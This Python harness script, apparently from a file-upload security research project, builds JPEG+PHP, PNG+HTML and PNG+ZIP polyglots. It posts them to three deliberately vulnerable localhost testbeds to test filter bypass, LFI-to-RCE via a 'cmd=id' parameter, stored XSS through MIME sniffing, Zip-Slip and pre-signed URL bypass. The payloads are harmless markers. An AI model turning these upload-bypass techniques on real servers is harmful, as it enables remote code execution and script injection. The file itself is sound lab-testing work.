"""
PolyMorph Testbed Harness Runner
=================================
Automated penetration test harness that:
  1. Generates polyglot test payloads using PolyMorph
  2. Submits them to all 3 testbed tiers via HTTP
  3. Records bypass/fail results
  4. Outputs a structured JSON report + rich terminal table

Usage:
    python testbed/harness/run_tests.py [--tier 1|2|3|all] [--report output.json]

NOTE: INTENTIONALLY VULNERABLE LAB ENVIRONMENTS — LOCAL RESEARCH ONLY
"""

import sys
import os
import json
import time
import argparse
import tempfile
import requests
from pathlib import Path
from datetime import datetime, timezone

# Add project root to path so we can import PolyMorph
SCRIPT_DIR = Path(__file__).parent
PROJECT_ROOT = SCRIPT_DIR.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

# ─── Configuration ──────────────────────────────────────────────────────────

TIER_URLS = {
    1: {
        "name": "Tier 1 — Legacy PHP (LAMP)",
        "base": "http://localhost:8081",
        "upload": "http://localhost:8081/upload.php",
        "lfi_template": "http://localhost:8081/?page=uploads/{filename}&cmd=id",
    },
    2: {
        "name": "Tier 2 — Modern MERN (Node.js + Express)",
        "base": "http://localhost:3001",
        "upload": "http://localhost:3001/upload",
        "static_template": "http://localhost:3001/uploads/{filename}",
        "files": "http://localhost:3001/files",
    },
    3: {
        "name": "Tier 3 — Cloud-Native (MinIO + FastAPI)",
        "base": "http://localhost:8000",
        "presigned": "http://localhost:8000/get-upload-url",
        "validate": "http://localhost:8000/validate-upload",
        "files": "http://localhost:8000/files",
    },
}

# Test payload embedded in polyglots — safe for lab demo
DEMO_PAYLOAD = b"<?php echo 'POLYMORPH_CMD_EXEC_' . phpversion() . '_' . php_uname(); ?>"
HTML_PAYLOAD = b"<script>document.title='XSS_FROM_POLYMORPH_' + location.href</script>"

# ─── Polyglot Builders ───────────────────────────────────────────────────────

def build_jpeg_php_polyglot() -> bytes:
    """Build a JPEG+PHP polyglot: valid JPEG with PHP payload in COM segment."""
    try:
        from PolyMorph.formats.jpeg import inject_payload, normalize
        # Minimal valid JPEG (1x1 white pixel)
        minimal_jpeg = bytes([
            0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
            0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,
            0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,0x07,0x07,0x07,0x09,
            0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
            0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,
            0x24,0x2E,0x27,0x20,0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,
            0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,0x39,0x3D,0x38,0x32,
            0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
            0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,
            0x01,0x05,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
            0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,
            0x03,0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,
            0x01,0x02,0x03,0x00,0x04,0x11,0x05,0x12,0x21,0x31,0x41,0x06,
            0x13,0x51,0x61,0x07,0x22,0x71,0x14,0x32,0x81,0x91,0xA1,0x08,
            0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,0x24,0x33,0x62,0x72,
            0x82,0x09,0x0A,0x16,0x17,0x18,0x19,0x1A,0x25,0x26,0x27,0x28,
            0xFF,0xD9
        ])
        host_norm = normalize(minimal_jpeg)
        res = inject_payload(host_norm, DEMO_PAYLOAD)
        return res[0] if isinstance(res, tuple) else res
    except Exception as e:
        print(f"[WARN] Could not build JPEG+PHP polyglot: {e}")
        return b""

def build_png_zip_polyglot() -> bytes:
    """Build a PNG+ZIP polyglot: valid PNG with ZIP appended after IEND."""
    try:
        import zipfile, io
        from PolyMorph.formats.png import normalize as png_normalize
        from PolyMorph.formats.zip_fmt import patch_offsets_and_tail

        # Minimal 1x1 red PNG
        minimal_png = bytes([
            0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,
            0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,
            0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE,
            0x00,0x00,0x00,0x0C,0x49,0x44,0x41,0x54,
            0x08,0xD7,0x63,0xF8,0xCF,0xC0,0x00,0x00,
            0x00,0x02,0x00,0x01,0xE2,0x21,0xBC,0x33,
            0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,
            0xAE,0x42,0x60,0x82
        ])

        png_norm = png_normalize(minimal_png)

        # Build a small ZIP in memory with a demo entry
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("polymorph_demo.txt", "PolyMorph parser differential demo payload\n")
        raw_zip = zip_buf.getvalue()

        # Patch the ZIP so its internal offsets account for PNG prefix
        patched_zip = patch_offsets_and_tail(raw_zip, len(png_norm))
        return png_norm + patched_zip
    except Exception as e:
        print(f"[WARN] Could not build PNG+ZIP polyglot: {e}")
        return b""

def build_png_html_polyglot() -> bytes:
    """Build a PNG+HTML polyglot: valid PNG with HTML/JS in tEXt chunk."""
    try:
        from PolyMorph.formats.png import normalize as png_normalize, inject_payload as png_inject
        minimal_png = bytes([
            0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,
            0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,
            0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE,
            0x00,0x00,0x00,0x0C,0x49,0x44,0x41,0x54,
            0x08,0xD7,0x63,0xF8,0xCF,0xC0,0x00,0x00,
            0x00,0x02,0x00,0x01,0xE2,0x21,0xBC,0x33,
            0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,
            0xAE,0x42,0x60,0x82
        ])
        png_norm = png_normalize(minimal_png)
        res = png_inject(png_norm, HTML_PAYLOAD)
        return res[0] if isinstance(res, tuple) else res
    except Exception as e:
        print(f"[WARN] Could not build PNG+HTML polyglot: {e}")
        return b""

# ─── Test Runners ────────────────────────────────────────────────────────────

def test_tier1(results: list):
    """Test Tier 1: Legacy PHP — LFI + magic byte bypass."""
    tier = TIER_URLS[1]
    print(f"\n[*] Testing {tier['name']}")

    # Health check
    try:
        r = requests.get(tier["base"], timeout=5)
        alive = r.status_code == 200
    except Exception:
        alive = False

    if not alive:
        results.append({
            "tier": 1, "name": tier["name"], "vector": "all",
            "status": "SKIP", "reason": "Testbed not running (start with docker compose up)"
        })
        print(f"  [SKIP] Tier 1 not running at {tier['base']}")
        return

    # Test 1: JPEG+PHP polyglot upload
    polyglot = build_jpeg_php_polyglot()
    if polyglot:
        try:
            r = requests.post(
                tier["upload"],
                files={"file": ("avatar.jpg", polyglot, "image/jpeg")},
                headers={"Accept": "application/json"},
                timeout=10
            )
            upload_result = r.json() if r.headers.get('content-type','').startswith('application/json') else {"raw": r.text}
            uploaded = upload_result.get("success", False) or "upload=ok" in r.url or any("upload=ok" in str(h.headers.get("Location","")) for h in r.history)
            filename = upload_result.get("path", "uploads/avatar.jpg").split("/")[-1] if uploaded else "avatar.jpg"

            # Check LFI execution
            lfi_triggered = False
            lfi_url = tier["lfi_template"].format(filename=filename)
            if uploaded:
                try:
                    lfi_r = requests.get(lfi_url, timeout=5)
                    lfi_triggered = "POLYMORPH_CMD_EXEC" in lfi_r.text or "uid=" in lfi_r.text
                except Exception:
                    pass

            results.append({
                "tier": 1,
                "name": tier["name"],
                "vector": "JPEG+PHP → LFI (RCE)",
                "upload_status": r.status_code,
                "upload_bypassed": uploaded,
                "lfi_triggered": lfi_triggered,
                "lfi_url": lfi_url,
                "status": "BYPASS" if uploaded else "BLOCKED",
                "note": f"Upload filter bypassed ({'LFI RCE confirmed' if lfi_triggered else 'LFI trigger ready'}). URL: {lfi_url}"
            })
            print(f"  [{'BYPASS' if uploaded else 'BLOCKED'}] Vector 1: JPEG+PHP upload → HTTP {r.status_code}{' (LFI Verified!)' if lfi_triggered else ''}")
        except Exception as e:
            results.append({"tier": 1, "vector": "JPEG+PHP → LFI", "status": "ERROR", "error": str(e)})
            print(f"  [ERROR] Vector 1: {e}")

def test_tier2(results: list):
    """Test Tier 2: MERN — MIME sniffing XSS + ZIP-Slip differential."""
    tier = TIER_URLS[2]
    print(f"\n[*] Testing {tier['name']}")

    try:
        r = requests.get(f"{tier['base']}/health", timeout=5)
        alive = r.status_code == 200
    except Exception:
        alive = False

    if not alive:
        results.append({
            "tier": 2, "name": tier["name"], "vector": "all",
            "status": "SKIP", "reason": "Testbed not running"
        })
        print(f"  [SKIP] Tier 2 not running at {tier['base']}")
        return

    # Test 1: PNG+HTML polyglot (Stored XSS via MIME sniffing)
    polyglot_html = build_png_html_polyglot()
    if polyglot_html:
        try:
            r = requests.post(
                tier["upload"],
                files={"file": ("avatar.png", polyglot_html, "image/png")},
                timeout=10
            )
            data = r.json() if r.ok else {}
            uploaded = data.get("success") or r.ok
            filename = data.get("filename", "avatar.png")
            results.append({
                "tier": 2, "name": tier["name"],
                "vector": "PNG+HTML → MIME Sniffing XSS",
                "upload_status": r.status_code,
                "upload_bypassed": uploaded,
                "xss_url": tier["static_template"].format(filename=filename) if uploaded else None,
                "status": "BYPASS" if uploaded else "BLOCKED",
                "note": "file-type magic check passed. Open XSS URL directly to trigger script execution."
            })
            print(f"  [{'BYPASS' if uploaded else 'BLOCKED'}] Vector 1: PNG+HTML MIME sniffing → HTTP {r.status_code}")
        except Exception as e:
            results.append({"tier": 2, "vector": "PNG+HTML XSS", "status": "ERROR", "error": str(e)})

    # Test 2: PNG+ZIP polyglot (parser differential + Zip-Slip)
    polyglot_zip = build_png_zip_polyglot()
    if polyglot_zip:
        try:
            r = requests.post(
                tier["upload"],
                files={"file": ("archive.png", polyglot_zip, "image/png")},
                timeout=10
            )
            data = r.json() if r.ok else {}
            uploaded = data.get("success") or r.ok
            results.append({
                "tier": 2, "name": tier["name"],
                "vector": "PNG+ZIP → Parser Differential (Zip-Slip)",
                "upload_status": r.status_code,
                "upload_bypassed": uploaded,
                "status": "BYPASS" if uploaded else "BLOCKED",
                "note": "file-type sees PNG, archiveWorker sees ZIP. Check backend/extracted/ after upload."
            })
            print(f"  [{'BYPASS' if uploaded else 'BLOCKED'}] Vector 2: PNG+ZIP differential → HTTP {r.status_code}")
            if uploaded:
                print(f"    → Wait 1s for archive worker to extract ZIP...")
                time.sleep(1.5)
        except Exception as e:
            results.append({"tier": 2, "vector": "PNG+ZIP differential", "status": "ERROR", "error": str(e)})

def test_tier3(results: list):
    """Test Tier 3: Cloud-Native — Pre-signed URL bypass + parser differential."""
    tier = TIER_URLS[3]
    print(f"\n[*] Testing {tier['name']}")

    try:
        r = requests.get(f"{tier['base']}/health", timeout=5)
        alive = r.status_code == 200
    except Exception:
        alive = False

    if not alive:
        results.append({
            "tier": 3, "name": tier["name"], "vector": "all",
            "status": "SKIP", "reason": "Testbed not running"
        })
        print(f"  [SKIP] Tier 3 not running at {tier['base']}")
        return

    # Test 1: Pre-signed URL bypass
    polyglot = build_png_zip_polyglot()
    if polyglot:
        try:
            # Step 1: Get pre-signed URL
            r = requests.get(
                f"{tier['presigned']}?filename=polymorph_bypass.png&content_type=image/png",
                timeout=10
            )
            presign_data = r.json()
            upload_url = presign_data.get("upload_url")

            if upload_url:
                # Step 2: Upload directly to MinIO (bypasses ALL server validation)
                r2 = requests.put(
                    upload_url,
                    data=polyglot,
                    headers={"Content-Type": "image/png"},
                    timeout=15
                )
                bypassed = r2.status_code in (200, 204)
                results.append({
                    "tier": 3, "name": tier["name"],
                    "vector": "Pre-signed URL Bypass",
                    "presign_status": r.status_code,
                    "upload_status": r2.status_code,
                    "upload_bypassed": bypassed,
                    "status": "BYPASS" if bypassed else "BLOCKED",
                    "note": "File uploaded directly to MinIO bucket, bypassing all FastAPI validation middleware."
                })
                print(f"  [{'BYPASS' if bypassed else 'BLOCKED'}] Vector 1: Pre-signed URL bypass → MinIO HTTP {r2.status_code}")

                # Step 3: Validate to trigger parser differential
                if bypassed:
                    time.sleep(1)
                    r3 = requests.post(
                        f"{tier['validate']}?filename=polymorph_bypass.png",
                        timeout=15
                    )
                    if r3.ok:
                        vdata = r3.json()
                        results.append({
                            "tier": 3, "name": tier["name"],
                            "vector": "Parser Differential (python-magic vs zipfile)",
                            "magic_mime": vdata.get("magic_mime"),
                            "zip_detected": vdata.get("zip_detected"),
                            "differential_gap": vdata.get("differential_gap"),
                            "status": "BYPASS" if vdata.get("zip_detected") else "NO_DIFFERENTIAL",
                        })
                        print(f"  [{'BYPASS' if vdata.get('zip_detected') else 'INFO'}] Vector 2: Parser differential — magic={vdata.get('magic_mime')}, zip={vdata.get('zip_detected')}")
        except Exception as e:
            results.append({"tier": 3, "vector": "Pre-signed URL bypass", "status": "ERROR", "error": str(e)})
            print(f"  [ERROR] Vector 1: {e}")

# ─── Report Generator ────────────────────────────────────────────────────────

def generate_report(results: list, output_path: str | None = None):
    report = {
        "tool": "PolyMorph Testbed Harness",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "disclaimer": "CONTROLLED LAB ENVIRONMENT — Academic research only. Not for use against real systems.",
        "results": results,
        "summary": {
            "total": len(results),
            "bypassed": sum(1 for r in results if r.get("status") == "BYPASS"),
            "blocked": sum(1 for r in results if r.get("status") == "BLOCKED"),
            "skipped": sum(1 for r in results if r.get("status") == "SKIP"),
            "errors": sum(1 for r in results if r.get("status") == "ERROR"),
        }
    }

    if output_path:
        with open(output_path, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n[✓] Report saved to: {output_path}")

    if HAS_RICH:
        console = Console()
        table = Table(title="PolyMorph Testbed Results", box=box.ROUNDED, show_lines=True)
        table.add_column("Tier", style="cyan", width=6)
        table.add_column("Attack Vector", style="white", min_width=35)
        table.add_column("Status", style="bold", width=10)
        table.add_column("Notes", style="dim", min_width=30)

        status_colors = {"BYPASS": "red", "BLOCKED": "green", "SKIP": "yellow", "ERROR": "magenta", "NO_DIFFERENTIAL": "blue"}

        for r in results:
            status = r.get("status", "?")
            color = status_colors.get(status, "white")
            table.add_row(
                str(r.get("tier", "?")),
                r.get("vector", r.get("name", "?")),
                f"[{color}]{status}[/{color}]",
                r.get("note", r.get("reason", r.get("error", "")))[:80]
            )

        console.print()
        console.print(table)
        console.print(Panel(
            f"[green]Total: {report['summary']['total']}[/]  "
            f"[red]Bypassed: {report['summary']['bypassed']}[/]  "
            f"[green]Blocked: {report['summary']['blocked']}[/]  "
            f"[yellow]Skipped: {report['summary']['skipped']}[/]",
            title="Summary", expand=False
        ))
    else:
        print("\n=== SUMMARY ===")
        for k, v in report["summary"].items():
            print(f"  {k}: {v}")

    return report

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="PolyMorph Testbed Harness Runner")
    parser.add_argument("--tier", choices=["1", "2", "3", "all"], default="all")
    parser.add_argument("--report", default=None, help="Output JSON report path")
    args = parser.parse_args()

    print("=" * 60)
    print("  PolyMorph Testbed Harness Runner")
    print("  CONTROLLED LAB — Academic Research Only")
    print("=" * 60)

    results = []
    tiers_to_run = [1, 2, 3] if args.tier == "all" else [int(args.tier)]

    for tier in tiers_to_run:
        if tier == 1:
            test_tier1(results)
        elif tier == 2:
            test_tier2(results)
        elif tier == 3:
            test_tier3(results)

    generate_report(results, args.report)

if __name__ == "__main__":
    main()
